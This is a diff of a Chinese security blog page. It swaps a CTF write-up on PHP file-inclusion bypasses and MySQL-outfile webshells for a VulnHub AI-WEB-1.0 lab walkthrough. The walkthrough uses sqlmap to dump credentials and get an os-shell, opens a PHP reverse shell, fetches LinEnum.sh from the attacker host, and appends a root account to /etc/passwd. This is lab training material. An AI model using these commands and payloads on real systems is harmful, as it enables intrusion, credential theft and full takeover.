@@ -8,27 +8,31 @@
   <link rel="dns-prefetch" href>
   <title>Saw,Learnt,To think</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="文件包含/SQL注入shell①Web_php_include 题目来源： 攻防世界  题目描述：暂无   解法一: 源码审计之文件包含过滤源码如下: 123456789&amp;lt;?phpshow_source(__FILE__);echo $_GET[&amp;apos;hello&amp;apos;];$page=$_GET[&amp;apos;page&amp;apos;];while (strstr($page, &amp;quo">
+  <meta name="description" content="0X01 靶机环境12攻击机：kali————192.168.0.110靶机：  AI-WEB-1.0————192.168.0.108  [靶机下载地址][https://www.vulnhub.com/entry/ai-web-1,353/] aaa 0X02 Walkthrough 网络扫描 1netdiscover 102.168.0.1/24  锁定目标   端口扫描 1nmap -T4">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Saw,Learnt,To think">
-<meta property="og:url" content="/2019/11/27/XCTF-Web进阶(二)/index.html">
+<meta property="og:url" content="/2020/02/12/AI-WEB-1.0——Workthrough/index.html">
 <meta property="og:site_name" content="Saw,Learnt,To think">
-<meta property="og:description" content="文件包含/SQL注入shell①Web_php_include 题目来源： 攻防世界  题目描述：暂无   解法一: 源码审计之文件包含过滤源码如下: 123456789&amp;lt;?phpshow_source(__FILE__);echo $_GET[&amp;apos;hello&amp;apos;];$page=$_GET[&amp;apos;page&amp;apos;];while (strstr($page, &amp;quo">
+<meta property="og:description" content="0X01 靶机环境12攻击机：kali————192.168.0.110靶机：  AI-WEB-1.0————192.168.0.108  [靶机下载地址][https://www.vulnhub.com/entry/ai-web-1,353/] aaa 0X02 Walkthrough 网络扫描 1netdiscover 102.168.0.1/24  锁定目标   端口扫描 1nmap -T4">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="/2019/11/27/XCTF-Web进阶(二)/6.png">
-<meta property="og:image" content="/2019/11/27/XCTF-Web进阶(二)/7.png">
-<meta property="og:image" content="/2019/11/27/XCTF-Web进阶(二)/8.png">
-<meta property="og:image" content="/2019/11/27/XCTF-Web进阶(二)/9.png">
-<meta property="og:image" content="/2019/11/27/XCTF-Web进阶(二)/1.png">
-<meta property="og:image" content="/2019/11/27/XCTF-Web进阶(二)/2.png">
-<meta property="og:image" content="/2019/11/27/XCTF-Web进阶(二)/3.png">
-<meta property="og:image" content="/2019/11/27/XCTF-Web进阶(二)/4.png">
-<meta property="og:image" content="/2019/11/27/XCTF-Web进阶(二)/5.png">
-<meta property="og:updated_time" content="2019-12-04T11:34:11.795Z">
+<meta property="og:image" content="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/1.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/2.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/3.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/4.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/5.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/6.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/7.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/8.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/9.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/10.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/11.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/13.png">
+<meta property="og:image" content="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/12.png">
+<meta property="og:updated_time" content="2020-02-12T09:55:06.014Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Saw,Learnt,To think">
-<meta name="twitter:description" content="文件包含/SQL注入shell①Web_php_include 题目来源： 攻防世界  题目描述：暂无   解法一: 源码审计之文件包含过滤源码如下: 123456789&amp;lt;?phpshow_source(__FILE__);echo $_GET[&amp;apos;hello&amp;apos;];$page=$_GET[&amp;apos;page&amp;apos;];while (strstr($page, &amp;quo">
-<meta name="twitter:image" content="/2019/11/27/XCTF-Web进阶(二)/6.png">
+<meta name="twitter:description" content="0X01 靶机环境12攻击机：kali————192.168.0.110靶机：  AI-WEB-1.0————192.168.0.108  [靶机下载地址][https://www.vulnhub.com/entry/ai-web-1,353/] aaa 0X02 Walkthrough 网络扫描 1netdiscover 102.168.0.1/24  锁定目标   端口扫描 1nmap -T4">
+<meta name="twitter:image" content="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Saw,Learnt,To think" type="application/atom+xml">
   
@@ -156,165 +160,124 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-XCTF-Web进阶(二)" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-AI-WEB-1.0——Workthrough" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="文件包含-SQL注入shell"><a href="#文件包含-SQL注入shell" class="headerlink" title="文件包含/SQL注入shell"></a>文件包含/SQL注入shell</h1><h3 id="①Web-php-include"><a href="#①Web-php-include" class="headerlink" title="①Web_php_include"></a>①Web_php_include</h3><ul>
-<li><p>题目来源： 攻防世界</p>
-</li>
-<li><p>题目描述：暂无</p>
-</li>
-</ul>
-<h4 id="解法一-源码审计之文件包含"><a href="#解法一-源码审计之文件包含" class="headerlink" title="解法一: 源码审计之文件包含"></a>解法一: 源码审计之文件包含</h4><p>过滤源码如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">echo $_GET[&apos;hello&apos;];</span><br><span class="line">$page=$_GET[&apos;page&apos;];</span><br><span class="line">while (strstr($page, &quot;php://&quot;)) &#123;</span><br><span class="line">    $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);</span><br><span class="line">&#125;</span><br><span class="line">include($page);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+        <h3 id="0X01-靶机环境"><a href="#0X01-靶机环境" class="headerlink" title="0X01 靶机环境"></a>0X01 靶机环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机：kali————192.168.0.110</span><br><span class="line">靶机：  AI-WEB-1.0————192.168.0.108</span><br></pre></td></tr></table></figure>
 
-<p><strong>背景知识</strong>:</p>
+<p>[靶机下载地址][<a href="https://www.vulnhub.com/entry/ai-web-1,353/]" target="_blank" rel="noopener">https://www.vulnhub.com/entry/ai-web-1,353/]</a></p>
+<p>aaa</p>
+<h3 id="0X02-Walkthrough"><a href="#0X02-Walkthrough" class="headerlink" title="0X02 Walkthrough"></a>0X02 Walkthrough</h3><ul>
+<li><p>网络扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover 102.168.0.1/24</span><br></pre></td></tr></table></figure>
+
+<p>锁定目标</p>
+<p><img src="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/1.png" alt="1"></p>
+</li>
+<li><p>端口扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 —A 192.168.0.108</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/2.png" alt="2"></p>
+<p>发现开放了80端口，http服务。并扫描到相关,禁止访问目录</p>
+</li>
+<li><p>访问服务</p>
 <ul>
-<li><p>strstr()</p>
-<p>查找 “world” 在 “Hello world!” 中是否存在，如果是，返回该字符串及后面剩余部分：</p>
+<li><p>先访问<code>192.168.0.108\robots.txt</code></p>
+<p>内容如下所示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: </span><br><span class="line">Disallow: /m3diNf0/</span><br><span class="line">Disallow: /se3reTdir777/uploads/</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>str_replace(a, b, c)</p>
-<p>在c字符串中, 用b来替换掉c</p>
+<li><p>扫描<code>/m3diNf0/</code>目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.0.108/m3diNf0/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/3.png" alt="3"></p>
+<p>发现PHP网页，访问看看</p>
+<p><img src="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/4.png" alt="4"></p>
+<p><code>info.php</code>网页中有许多有用的信息,下文会用到</p>
+</li>
+<li><p>遍历以上扫描到的链接</p>
+<p>在<code>http://192.168.0.108/se3reTdir777/</code>中发现有查询功能, 并输入<code>&#39;</code>发现放回错误,可能存在注入</p>
 </li>
 </ul>
-<h5 id="1-php-大小写绕过"><a href="#1-php-大小写绕过" class="headerlink" title="1. php:// 大小写绕过"></a>1. php:// 大小写绕过</h5><p><font color="red">php://伪协议格式要求</font></p>
-<p>​        a. php://input<code>作为参数输入, 如</code>?page=php://input`</p>
-<p>​        b. POST输入数据区域, 输入php代码, 如 <code>&lt;?php system(&quot;ls&quot;);?&gt;</code></p>
+</li>
+<li><p>SQLmap注入</p>
+<p>用burpsuite拦截一下,发现POST参数为<code>uid</code>,sqlmap注入语法如下</p>
 <ul>
-<li><p>利用如下</p>
+<li><p>库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.0.108/se3reTdir777/&quot; --data=&quot;uid=1&amp;Operation=Submit&quot; --dbs --batch</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>while函数是匹配<code>php://</code>, 并没有做大小写过滤, 可以利用这一点绕过<code>while</code>语句, 直接进入<code>include</code>包含函数</p>
+<li><p>表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.0.108/se3reTdir777/&quot; --data=&quot;uid=1&amp;Operation=Submit&quot; -D aiweb1 --tables --batch</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>利用如下, 打开burpsuite, 修改成如下数据</p>
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/6.png" alt="6"></p>
+<li><p>字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.0.108/se3reTdir777/&quot; --data=&quot;uid=1&amp;Operation=Submit&quot; -D aiweb1 -T systemUser --columns --batch</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>看到了flag文件, 直接进行读取</p>
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/7.png" alt="7"></p>
+<li><p>值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.0.108/se3reTdir777/&quot; --data=&quot;uid=1&amp;Operation=Submit&quot; -D aiweb1 -T systemUser -C &quot;password,userName&quot; --batch</span><br></pre></td></tr></table></figure>
+
+<p>结果如下:</p>
+<p><img src="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/5.png" alt="5">        </p>
+</li>
+<li><p>观察密码像是base64, 利用burpsuite的<code>decode</code>模块解密</p>
+<p><img src="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/6.png" alt="6"></p>
 </li>
 </ul>
-<h5 id="2-http-127-0-0-1-本地读取"><a href="#2-http-127-0-0-1-本地读取" class="headerlink" title="2. http ://127.0.0.1 本地读取"></a>2. <font color="red">http ://127.0.0.1 本地读取</font></h5><ul>
-<li><p>利用目录扫描工具, 能够直接发现当前页面是<code>index.php</code></p>
-<p>因此就利用本地读取, 再次读取当前页面, 将操作函数赋值给hello</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:48772/?page=http://127.0.0.1/index.php/?hello=%3C?system(%22ls%22);?%3E</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/8.png" alt="8"></p>
 </li>
-<li><p>利用show_source函数, 输出flag文件的值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:48772/?page=http://127.0.0.1/index.php/?hello=%3C?show_source(%22fl4gisisish3r3.php%22);?%3E</span><br></pre></td></tr></table></figure>
+<li><p>SQLmap之<code>--os-shell</code>字段注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.0.108/se3reTdir777/&quot; --data=&quot;uid=1&amp;Operation=Submit&quot; -D aiweb1 --os-shell</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/9.png" alt="9"></p>
+<p>依次按以下按键</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">Y</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<p>输入注入路径: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</span><br></pre></td></tr></table></figure>
+
+<p>改路径在上文寻找到的<code>info.php</code>中得来, 搜索关键字<code>DOCUMENT_ROOT</code>, 再加上我们寻找到的网页目录</p>
+<p><img src="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/7.png" alt="7"></p>
+<p>进入os-shell, 利用<code>id</code>和<code>cat /etc/passwd</code>发现这里并没有什么用, 应为权限不够,无法进入root目录</p>
+<p><code>sudo -l</code>提权, 很明显也不可以</p>
 </li>
-</ul>
-<h5 id="3-data-伪协议的利用"><a href="#3-data-伪协议的利用" class="headerlink" title="3. data:// 伪协议的利用"></a>3. data:// 伪协议的利用</h5><p><font color="red">data://伪协议格式要求</font></p>
-<p>​        a. data://<code>资源类型</code> ; <code>编码</code> , <code>内容</code></p>
-<p>​        b. 添加编码为base64时, 记住, 不能添加<code>;</code>, 即<code>&lt;?php phpinfo()?&gt;</code> 没有 <code>;</code></p>
+<li><p>-os-shell没有权限,那么我们只能提权来达到目的, 在进行-os-shell的步骤中, 它是实现上传好了一个马到目标网址上, 在这里寻找</p>
+<p><img src="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/8.png" alt="8"></p>
 <ul>
-<li><p>是否可以换一个思路, 利用data:// 伪协议来获取flag</p>
-<p>获取文件目录,  </p>
-<p><code>echo $_SERVER[&#39;DOCUMENT_ROOT&#39;];</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:48772/index.php?page=data://text/plain,%3C?php%20echo%20$_SERVER[%27DOCUMENT_ROOT%27];?%3E</span><br><span class="line"></span><br><span class="line">或添加编码类型 ,base64</span><br><span class="line">http://111.198.29.45:48772/index.php?page=data://text/plain;base64,PD9waHAgZWNobyAkX1NFUlZFUlsiRE9DVU1FTlRfUk9PVCJdPz4=</span><br></pre></td></tr></table></figure>
+<li><p>访问网址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/se3reTdir777/uploads/tmpuxhkr.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>上传PHP马</p>
+<p>先修改IP地址, 该IP地址为攻击机IP地址</p>
+<p><img src="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/9.png" alt="9"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/webshells/php/php-reverse-shell.php /root/shell.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>新建终端,监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>
 
-<p>获得目录名, <code>var/www</code></p>
+<p>访问shell.php, 反弹到攻击机</p>
+<p><img src="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/10.png" alt="10"></p>
 </li>
-<li><p>获取当前目录下的文件</p>
-<ul>
-<li><p>scandir()函数, 获取目录下的文件名</p>
+<li><p>得到反弹后,开始提权操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#模拟终端</span><br><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br><span class="line">#进入有写权限的tmp目录</span><br><span class="line">cd /tmp</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>print_r()函数, 将scandir()函数获取的输出</p>
+<li><p>再新建一个终端, 开启python的一句话建议http服务, 用来将<code>LinEnum.sh</code>传输给靶机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/11.png" alt="11"></p>
+</li>
+<li><p>回到反弹shell的终端, wget获取提权脚本<code>LinEnum.sh</code>, 并运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.13.132:8000/LinEnum.sh</span><br><span class="line">chmod 777 LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>现在,我们可以创建具有root权限的账户了, 也具有写入/etc/passwd的权限</p>
+<p>先打开一个终端, 生成密码的hash值, 密码为<code>pass123</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt user3 pass123</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>回到反弹shell的终端, 创建账户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#根据/etc/passwd文件的格式写入账户和密码, 账户为test;密码为pass123</span><br><span class="line">echo &apos;test:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash&apos; &gt;&gt;/etc/passwd</span><br><span class="line">#查看是否写入成功</span><br><span class="line">tail /etc/passwd</span><br><span class="line">#切换用户</span><br><span class="line">su test</span><br><span class="line">#进入root目录查看flag文件</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/13.png" alt="13"></p>
+<p>切换用户,并查看flag文件</p>
+<p><img src="/Users/caizhe/Desktop/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/VulnHub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/AI-WEB-1.0%E2%80%94%E2%80%94Workthrough/12.png" alt="12"></p>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:48772/index.php?page=data://text/plain,%3C?php%20print_r(scandir(%27/var/www%27));?%3E</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>输出文件内容</p>
-<ul>
-<li>file_get_contents()函数, 获取文件内容</li>
-</ul>
-</li>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:48772/index.php?page=data://text/plain,%3C?php%20$a_code%20=%20file_get_contents(%27fl4gisisish3r3.php%27);%20echo%20htmlspecialchars($a_code);?%3E</span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-</ul>
-<h4 id="解法二-SQL注入shell"><a href="#解法二-SQL注入shell" class="headerlink" title="解法二: SQL注入shell"></a><strong>解法二: SQL注入shell</strong></h4><ul>
-<li><p>先用目录扫描工具, 扫描一下网站</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://111.198.29.45:48772/ -e *</span><br></pre></td></tr></table></figure>
-
-<p>其结果如下</p>
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/1.png" alt="1"></p>
-<p>发现, 后台, 进入后台, 发现是空密码直接回车就可以进入后台</p>
-</li>
-<li><p>发现有一个数据库是空数据库, 名字为<code>test</code></p>
-<p>那么这里我们就有两个经典老套思路</p>
-<p><font color="red">1. 通过mysql的<code>outfile</code>写入shell</font></p>
-<p><font color="red">2. 通过日志拿 shell</font></p>
-</li>
-</ul>
-<h5 id="1-mysql写入shell"><a href="#1-mysql写入shell" class="headerlink" title="1. mysql写入shell"></a>1. mysql写入shell</h5><ul>
-<li><p>因为用目录扫描工具扫描到了, <code>phpinfo</code>, 可以搜索一下web目录</p>
-<p>control+f 搜索 <code>document_root</code></p>
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/2.png" alt="2"></p>
-<p>这样就知道了, 一会<code>outfile</code>函数所需要的函数了</p>
-</li>
-<li><p>到<code>test</code>数据库下进行SQL插叙, 插入语句</p>
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/3.png" alt="3"></p>
-</li>
-<li><p>依次执行</p>
-<ul>
-<li><p>建立temp表，里面就一个cmd字段</p>
-</li>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Create TABLE temp(cmd text NOT NULL)</span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li><p>把一句话木马插入到temp表</p>
-</li>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Insert INTO temp (cmd) VALUES(&apos;&lt;?php eval($_POST[cmd]); ?&gt;&apos;)</span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-</ul>
-<ul>
-<li><p>查询temp表中的一句话并把结果导入到shell.php</p>
-</li>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select cmd from temp into outfile &apos;/var/www/shell.php&apos;</span><br></pre></td></tr></table></figure>
-
-<p>执行到这里的时候, 发现报错了, 猜测应该是没有权限写入</p>
-<p>既然没有权限, 那我们就试试常用的 <code>tmp</code> 目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select cmd from temp into outfile &apos;/tmp/shell.php&apos;</span><br></pre></td></tr></table></figure>
-
